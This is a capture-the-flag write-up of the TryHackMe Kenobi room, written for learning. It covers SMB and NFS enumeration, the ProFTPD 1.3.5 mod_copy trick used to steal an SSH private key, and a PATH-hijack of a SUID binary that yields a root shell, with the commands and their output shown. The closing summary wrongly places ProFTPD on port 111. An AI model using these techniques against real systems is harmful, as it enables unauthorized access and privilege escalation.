### Description from THM
> Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.

The Kenobi room in **TryHackMe** has several tasks for us to complete. I am following along with the steps in this room and I'll answer them as we go along (the questions are bolded), however, please know I will not share any credentials or flags. As I hope you will attempt this on your own as well! 

Let's begin!

---

### Tools
* Nmap
* gobuster
* smbclient
* netcat
* searchploit

### Task 1 - Deploy the machine and scan the network
*I am using the THM AttackBox to complete this room*

First we'll run an **nmap** scan of the target machine!
```
root@ip-10-10-204-174:~# nmap -sC -sV 10.10.116.87

Starting Nmap 7.60 ( https://nmap.org ) at 2022-03-12 23:40 GMT
Nmap scan report for ip-10-10-116-87.eu-west-1.compute.internal (10.10.116.87)
Host is up (0.0012s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (EdDSA)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      37226/udp  mountd
|   100005  1,2,3      38223/tcp  mountd
|   100021  1,3,4      36819/tcp  nlockmgr
|   100021  1,3,4      54561/udp  nlockmgr
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
MAC Address: 02:5B:4D:DE:0D:87 (Unknown)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2022-03-12T17:41:02-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-03-12 23:41:02
|_  start_date: 1600-12-31 23:58:45

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.89 seconds
```
**How many ports are open?**
There are **7** ports open. 
* Port 21 - FTP (ProFTPD 1.3.5)
* Port 22 - SSH 
* Port 80 - HTTP
* Port 111 - RPCBind
* Port 139/445 - SMB
* Port 2049 - NFS_ACL

Let's take a quick peek at the web server on **Port 80** first. The **nmap** scan also provided us with the `/admin.html` page.
```
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
``` 

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1647129078305/DG_NcVGYo.png)

We get a lovely photo of Obi-Wan Kenobi fighting Anakin Skywalker. 

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1647129295478/kv5CHJLvm.png)

When we go to the `/admin.html` page we get a GIF of Admiral Ackbar saying "IT'S A TRAP!"

So far these are the only two web pages we can look at, let's give **gobuster** a try and see if we can find any more directories. 
```
root@ip-10-10-204-174:~# gobuster dir -u http://10.10.116.87/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.116.87/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/03/13 00:02:32 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.html (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
===============================================================
2022/03/13 00:02:32 Finished
===============================================================
```

Nothing useful for us, so let's move on and try to enumerate **smb** for shares!

### Task 2 - Enumerating Samba for shares
To enumerate SMB shares we can use **nmap**. **Nmap** has a script that lets us do so!

We can do this with the following command: 

`nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <ip>`
* **-p** - we can select the port we're using, in this case **Port 445** (SMB has two ports: 139 (older version of SMB) and 445 (later versions))
* **--script** - we use this switch to select the script(s) we want to use

```
PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:5B:4D:DE:0D:87 (Unknown)

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.116.87\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.116.87\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.116.87\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
```
**How many shares have been found?** There are 3 shares:
* ` \\10.10.116.87\IPC$`
* `\\10.10.116.87\anonymous`
* `\\10.10.116.87\print$`

Now let's check how the `\\10.10.116.87\anonymous` share first, since that looks like the most interesting one!

We can use the following command, which uses **smbclient** to access this share: 

`smbclient //<ip>/anonymous`

When it asks for password just hit ENTER, since we haven't discovered any password(s) yet. 

```
root@ip-10-10-204-174:~# smbclient //10.10.116.87/anonymous
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 11:49:09 2019
  ..                                  D        0  Wed Sep  4 11:56:07 2019
  log.txt                             N    12237  Wed Sep  4 11:49:09 2019

		9204224 blocks of size 1024. 6876652 blocks available
```
**What is the file that we see?** We can see the `log.txt` file. 
To open this file we can run `get log.txt` and we can open it on our machine. 

Upon opening it, we get information about an SSH key generated for Kenobi and information about the ProFTPD server. 
```
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
```
```
# This is a basic ProFTPD configuration file (rename it to 
# 'proftpd.conf' for actual use.  It establishes a single server
# and a single anonymous login.  It assumes that you have a user/group
# "nobody" and "ftp" for normal operation and anon.

ServerName			"ProFTPD Default Installation"
ServerType			standalone
DefaultServer			on

# Port 21 is the standard FTP port.
Port				21
```

**What port if FTP running on?** We know from earlier and the information in the file that FTP is on Port 21. 

Let's continuing enumerating though! From our **nmap** scan earlier, **Port 111** was running **rpcbind**. 

Here's a snippet of what this server is from THM: 
> This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. 

For us, port 111 is access to a network file system. We can use **nmap** to enumerate this by using the following command: 

`nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <ip>`

```
PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-showmount: 
|_  /var *
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1836980.0  6876648.0  22%   16.0T        32000
MAC Address: 02:5B:4D:DE:0D:87 (Unknown)
```
**What mount can we see?** We can see `/var`. 

We've done quite a bit of enumerating, so let's move onto the third task now. 

### Task 3 - Gain initial access with ProFtpd
Here is a description from THM for ProFtpd: 
> ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions.

Let's figure out the version of ProFtpd. We can check our **nmap** scan from earlier, which shows us version **1.3.5**. Or we can use **netcat **to connect to the machine on the FTP port. 

```
root@ip-10-10-204-174:~# nc 10.10.116.87 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.116.87]
```

THM recommends we use **searchploit** to find exploits for our version. 
```
root@ip-10-10-204-174:~# searchsploit proftpd 1.3.5
[i] Found (#2): /opt/searchsploit/files_exploits.csv
[i] To remove this message, please edit "/opt/searchsploit/.searchsploit_rc" for "files_exploits.csv" (package_array: exploitdb)

[i] Found (#2): /opt/searchsploit/files_shellcodes.csv
[i] To remove this message, please edit "/opt/searchsploit/.searchsploit_rc" for "files_shellcodes.csv" (package_array: exploitdb)

------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Executi | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command  | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                  | linux/remote/36742.txt
------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Here is another note from THM: 
> You should have found an exploit from ProFtpd's [mod_copy module](http://www.proftpd.org/docs/contrib/mod_copy.html). 

> The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

Earlier we gathered that the FTP service is running as the Kenobi user and an SSH was generated for that user. We're now going to copy Kenobi's private key using the commands we just learned about from THM (**SITE CPFR** and **SITE CPTO**). 

To do this we need to run **netcat** again and run the commands like so:
```
root@ip-10-10-204-174:~# nc 10.10.116.87 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.116.87]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```
What this did was copy from (**CPFR**) the `/home/kenobi/.ssh/id_rsa` file. Then copied it to (**CPTO**) `/var/tmp/id_rsa` (remember the mount we discovered earlier `/var`). 

We'll need to mount the `/var/tmp` directory to our machine (these commands are provided by THM): 

`mkdir /mnt/kenobiNFS`

`mount machine_ip:/var /mnt/kenobiNFS`

`ls -la /mnt/kenobiNFS`

```
root@ip-10-10-204-174:~# sudo mkdir /mnt/kenobiNFS
root@ip-10-10-204-174:~# sudo mount 10.10.116.87:/var /mnt/kenobiNFS
root@ip-10-10-204-174:~# ls -la /mnt/kenobiNFS/
total 56
drwxr-xr-x 14 root root  4096 Sep  4  2019 .
drwxr-xr-x  3 root root  4096 Mar 13 01:31 ..
drwxr-xr-x  2 root root  4096 Sep  4  2019 backups
drwxr-xr-x  9 root root  4096 Sep  4  2019 cache
drwxrwxrwt  2 root root  4096 Sep  4  2019 crash
drwxr-xr-x 40 root root  4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff 4096 Apr 12  2016 local
lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 10 root lxd   4096 Sep  4  2019 log
drwxrwsr-x  2 root mail  4096 Feb 26  2019 mail
drwxr-xr-x  2 root root  4096 Feb 26  2019 opt
lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run
drwxr-xr-x  2 root root  4096 Jan 29  2019 snap
drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
drwxrwxrwt  6 root root  4096 Mar 13 01:17 tmp
drwxr-xr-x  3 root root  4096 Sep  4  2019 www
```
The network mount is on our machine. Now we can attempt logging into Kenobi's account! We'll need to get to the `id_rsa` file and login using **SSH**.

```
root@ip-10-10-204-174:~# cp /mnt/kenobiNFS/tmp/id_rsa .
root@ip-10-10-204-174:~# sudo chmod 600 id_rsa
root@ip-10-10-204-174:~# ssh -i id_rsa kenobi@10.10.116.87
The authenticity of host '10.10.116.87 (10.10.116.87)' can't be established.
ECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.116.87' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ 
```
We now have access as the Kenobi user! THM now wants us to get the user flag:

```
kenobi@kenobi:~$ ls 
share  user.txt
kenobi@kenobi:~$ cat user.txt 
<user flag here>
```

### Task 4: Privilege Escalation with Path Variable Manipulation
This is our final task! Let's read what THM has to say about SUID bits:
> SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.

THM provides us with a command to use to help us search the system for these types of files: 

`find / -perm -u=s -type f 2>/dev/null`

```
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```
**What file looks particulary out of the ordinary?**
The `/usr/bin/menu` looks a bit odd. It could be worth checking out. 

**Run the binary, how many options appear?**
```
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```
There are **3** choices for us to choose from. 

Let's continue with the task! We need to get the root flag. In order to do this, we'll need to manipulate our path to gain a root shell. THM provides us with the commands to do this: 
```
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
# 
```
THM explains why we did this: 
> We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!

All that's left for us to do is find the root flag! We can run the following command to get it: 

`# cat /root/root.txt`

### Summary
I really enjoyed this Star Wars themed room! Especially since the new Obi-Wan Kenobi show is going to come out on Disney+ soon! We learned quite a lot in this room and practiced looking for samba shares and exploiting ProFtpd on Port 111. There are some things I personally have not done before such as getting a root shell through `/usr/bin/menu`. That is something I (we) should study on and look into. I"m happy that TryHackMe gave us some guidance boosts. Since this is considered one of the easy rooms, I know in the near future when I attempt the medium and hard levels THM won't hold our hands! But this is part of the learning process and getting used to using various tools! I hope you enjoyed this and I'll be posting more write-ups soon! 
